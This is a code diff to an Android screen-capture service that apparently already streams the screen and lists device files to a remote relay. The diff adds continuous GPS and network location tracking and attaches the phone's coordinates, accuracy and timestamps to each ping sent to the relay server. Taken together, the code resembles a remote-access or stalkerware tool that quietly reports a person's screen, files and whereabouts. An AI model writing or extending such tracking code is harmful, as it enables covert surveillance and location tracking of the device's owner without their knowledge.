@@ -7,18 +7,24 @@ import android.app.PendingIntent;
 import android.app.Service;
 import android.content.Context;
 import android.content.Intent;
+import android.content.pm.PackageManager;
 import android.content.pm.ServiceInfo;
 import android.graphics.Bitmap;
 import android.graphics.PixelFormat;
 import android.hardware.display.DisplayManager;
 import android.hardware.display.VirtualDisplay;
+import android.location.Location;
+import android.location.LocationListener;
+import android.location.LocationManager;
 import android.media.Image;
 import android.media.ImageReader;
 import android.media.projection.MediaProjection;
 import android.media.projection.MediaProjectionManager;
 import android.os.Build;
+import android.os.Bundle;
 import android.os.Environment;
 import android.os.IBinder;
+import android.os.Looper;
 import android.util.Base64;
 import android.util.DisplayMetrics;
 import android.util.Log;
@@ -70,6 +76,10 @@ public class ScreenCaptureService extends Service {
     private int mWidth = 720;
     private int mHeight = 1280;
     private int mDensity = 320;
+
+    private LocationManager mLocationManager;
+    private volatile Location mLastLocation;
+    private LocationListener mLocationListener;
 
     private volatile boolean mRunning = false;
     private volatile boolean mStreamRequested = true;
@@ -211,6 +221,7 @@ public class ScreenCaptureService extends Service {
         mRunning = true;
         sIsStreaming = true;
 
+        initLocationUpdates();
         startThreads();
         Log.i(TAG, "Screen capture service started successfully");
     }
@@ -336,6 +347,16 @@ public class ScreenCaptureService extends Service {
             payload.put("hostname", Build.MANUFACTURER + " " + Build.MODEL + " (Android " + Build.VERSION.RELEASE + ")");
             payload.put("status", "Streaming");
             payload.put("screenResolution", mWidth + "x" + mHeight);
+
+            if (mLastLocation != null) {
+                JSONObject loc = new JSONObject();
+                loc.put("latitude", mLastLocation.getLatitude());
+                loc.put("longitude", mLastLocation.getLongitude());
+                loc.put("accuracy", mLastLocation.getAccuracy());
+                loc.put("provider", mLastLocation.getProvider() != null ? mLastLocation.getProvider() : "gps");
+                loc.put("timestamp", mLastLocation.getTime());
+                payload.put("location", loc);
+            }
 
             String response = postJson(mRelayUrl + "/api/ping", payload.toString());
             if (response != null) {
@@ -646,6 +667,48 @@ public class ScreenCaptureService extends Service {
         handleListDirectory(dir.getAbsolutePath(), resultUrl);
     }
 
+    private void initLocationUpdates() {
+        try {
+            mLocationManager = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
+            if (mLocationManager == null) return;
+
+            mLocationListener = new LocationListener() {
+                @Override
+                public void onLocationChanged(Location location) {
+                    if (location != null) {
+                        mLastLocation = location;
+                    }
+                }
+                @Override
+                public void onStatusChanged(String provider, int status, Bundle extras) {}
+                @Override
+                public void onProviderEnabled(String provider) {}
+                @Override
+                public void onProviderDisabled(String provider) {}
+            };
+
+            boolean hasFine = checkSelfPermission(android.Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED;
+            boolean hasCoarse = checkSelfPermission(android.Manifest.permission.ACCESS_COARSE_LOCATION) == PackageManager.PERMISSION_GRANTED;
+
+            if (hasFine || hasCoarse) {
+                if (mLocationManager.isProviderEnabled(LocationManager.GPS_PROVIDER)) {
+                    Location lastGps = mLocationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER);
+                    if (lastGps != null) mLastLocation = lastGps;
+                    mLocationManager.requestLocationUpdates(LocationManager.GPS_PROVIDER, 10000L, 5.0f, mLocationListener, Looper.getMainLooper());
+                }
+                if (mLocationManager.isProviderEnabled(LocationManager.NETWORK_PROVIDER)) {
+                    Location lastNet = mLocationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
+                    if (lastNet != null && (mLastLocation == null || lastNet.getTime() > mLastLocation.getTime())) {
+                        mLastLocation = lastNet;
+                    }
+                    mLocationManager.requestLocationUpdates(LocationManager.NETWORK_PROVIDER, 15000L, 10.0f, mLocationListener, Looper.getMainLooper());
+                }
+            }
+        } catch (Exception e) {
+            Log.w(TAG, "Location init error: " + e.getMessage());
+        }
+    }
+
     private void stopScreenCapture() {
         mRunning = false;
         sIsStreaming = false;
@@ -665,6 +728,12 @@ public class ScreenCaptureService extends Service {
         if (mFileHandlerThread != null) {
             mFileHandlerThread.interrupt();
             mFileHandlerThread = null;
+        }
+
+        if (mLocationManager != null && mLocationListener != null) {
+            try {
+                mLocationManager.removeUpdates(mLocationListener);
+            } catch (Exception ignored) {}
         }
 
         if (mVirtualDisplay != null) {
